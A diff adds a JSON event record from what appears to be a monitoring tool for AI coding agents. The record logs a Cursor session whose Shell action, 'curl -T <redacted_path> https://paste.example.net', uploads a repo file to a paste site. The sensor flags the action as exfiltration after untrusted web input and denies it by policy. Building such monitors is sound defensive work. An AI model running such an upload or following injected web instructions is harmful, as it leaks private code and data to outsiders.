@@ -1,0 +1,66 @@
+{
+  "schema": "privometry.event/v1",
+  "event_id": "evt_01JAB7S2B4D6F8H0J2K4M6N8Q0",
+  "type": "action",
+  "occurred_at": "2026-10-23T09:31:45.900Z",
+  "device_seq": 18343,
+  "org_id": "org_01JA0000000000000000000001",
+  "device": {
+    "device_id": "dev_01J9ZZK2M4N6P8Q0R2S4T6V8W0",
+    "os": "macos",
+    "os_version": "15.4",
+    "arch": "arm64",
+    "sensor_version": "0.4.2"
+  },
+  "user": {
+    "local_user": "hmac-sha256:9f2c4e1a7b3d5f6081a2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718",
+    "user_id": "usr_01J9ZY1M3K5N7Q9S1V3X5Z7B9D"
+  },
+  "agent": {
+    "product": "cursor",
+    "version": "2.0.43",
+    "session_id": "ses_01JAB7P0A2C4E6G8J0K2M4N6P8",
+    "native_session_id": "conv_8f2a",
+    "pattern": "interactive"
+  },
+  "repo": {
+    "remote": "github.com/acme/api",
+    "branch": "main"
+  },
+  "action": {
+    "kind": "network_fetch",
+    "tool_name": "Shell",
+    "target": "curl -T <redacted_path> https://paste.example.net",
+    "intent": [
+      "network_upload"
+    ],
+    "path_class": "repo",
+    "categories": [
+      "exfiltration"
+    ],
+    "risk": "high"
+  },
+  "context": {
+    "untrusted_input_seen": true,
+    "untrusted_sources": [
+      "web_fetch"
+    ],
+    "cwd_scope": "repo"
+  },
+  "decision": {
+    "verdict": "deny",
+    "would_verdict": "deny",
+    "source": "policy",
+    "mode": "monitor",
+    "rule_ids": [
+      "privometry/exfiltration:upload-to-paste-site"
+    ],
+    "bundle_id": "bnd_01JAB1QZ0000000000000000AB",
+    "policy_version": 42,
+    "latency_ms": 2
+  },
+  "redaction": {
+    "action.target": "redacted",
+    "user.local_user": "hashed"
+  }
+}
